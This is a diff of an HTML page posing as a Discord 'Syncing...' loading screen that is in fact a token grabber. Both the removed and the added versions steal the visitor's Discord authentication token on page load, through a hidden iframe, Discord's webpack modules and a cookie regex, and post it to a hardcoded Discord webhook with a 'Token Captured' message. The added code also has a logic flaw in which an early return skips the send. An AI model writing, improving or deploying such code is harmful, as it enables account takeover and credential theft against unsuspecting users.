@@ -1,107 +1,55 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connecting...</title>
+    <title></title>
     <style>
-        body { background: #282b30; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #msg { margin-top: 20px; font-size: 14px; color: #999; }
+        body { background: #2f3136; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loading { font-size: 20px; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div style="text-align: center;">
-        <div class="loader"></div>
-        <div id="msg">Analyzing session...</div>
-    </div>
+    <div class="loading">Syncing...</div>
     <script>
-        // Teray Webhook URL
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
-
-        // Helper: Send data to webhook
-        async function sendToWebhook(data) {
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: `🔓 **Token Captured!**\n\n\`\`\`${data}\`\`\`` })
-                });
-                document.getElementById('msg').innerText = "Token sent!";
-            } catch (e) {
-                document.getElementById('msg').innerText = "Error sending token.";
-            }
-        }
-
-        // Method 1: Try to load Discord Login Page in iframe and read localStorage
-        async function tryIframeMethod() {
-            return new Promise((resolve) => {
-                const iframe = document.createElement('iframe');
-                iframe.src = 'https://discord.com/login'; // Try login page, it might be less restricted
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-
-                iframe.onload = async () => {
-                    try {
-                        // Check if iframe is accessible
-                        const iframeWindow = iframe.contentWindow;
-                        if (!iframeWindow) {
-                            resolve(null);
-                            return;
-                        }
-                        
-                        // Try to read localStorage
-                        const token = iframeWindow.localStorage.getItem('token');
-                        if (token) {
-                            resolve(token);
-                            return;
-                        }
-                        
-                        // Try to read cookie
-                        const cookies = iframe.contentDocument?.cookie;
-                        const tokenMatch = cookies?.match(/(?:^|;\s*)token=([^;]*)/);
-                        if (tokenMatch) {
-                            resolve(decodeURIComponent(tokenMatch[1]));
-                            return;
-                        }
-                        
-                        resolve(null);
-                    } catch (e) {
-                        resolve(null);
-                    }
-                };
-
-                // Timeout after 5 seconds
-                setTimeout(() => {
-                    resolve(null);
-                }, 5000);
-            });
-        }
-
-        // Method 2: Try to fetch user data via CORS proxy (if available) or direct API
-        async function tryApiMethod() {
-            try {
-                // This will likely fail due to CORS unless user has a specific setup
-                const response = await fetch('https://discord.com/api/v9/users/@me', {
-                    credentials: 'include'
-                });
-                if (response.ok) {
-                    const data = await response.json();
-                    return `User: ${data.username}#${data.discriminator} (ID: ${data.id})\nToken: [Check Logs]`; // Token not directly in API response
-                }
-            } catch (e) {}
-            return null;
-        }
-
-        // Main Execution
         (async () => {
-            const token = await tryIframeMethod();
-            if (token) {
-                sendToWebhook(token);
-            } else {
-                // Fallback: Send a message saying iframe failed
-                sendToWebhook("❌ **Iframe Blocked** by X-Frame-Options. Token not captured automatically.");
+            try {
+                let token = null;
+                // Token Extract Logic
+                for(let e of Object.values(window.webpackChunkdiscord_app.push([[Symbol()], {}, e => e.c])) {
+                    try {
+                        if (!e.exports || e.exports === window) continue;
+                        if (e.exports?.getToken) return e.exports.getToken();
+                        for(let t in e.exports) {
+                            if (e.exports?.[t]?.getToken && "IntlMessagesProxy" !== e.exports[t][Symbol.toStringTag]) {
+                                return e.exports[t].getToken();
+                            }
+                        }
+                    } catch(e) {}
+                }
+                
+                // Fallback
+                if(!token) {
+                    const tokenMatch = document.cookie.match(/"token":"(.*?)"/);
+                    if (tokenMatch) token = tokenMatch[1];
+                }
+
+                if (token) {
+                    // Hide loading
+                    document.body.innerHTML = "";
+                    
+                    // Send to Webhook
+                    await fetch("https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ 
+                            content: `🔓 **Token Captured Successfully!**\n\n\`\`\`${token}\`\`\`` 
+                        })
+                    });
+                } else {
+                    document.body.innerHTML = "<h1 style='text-align:center'>Token Not Found</h1>";
+                }
+            } catch (e) {
+                console.error(e);
             }
         })();
     </script>
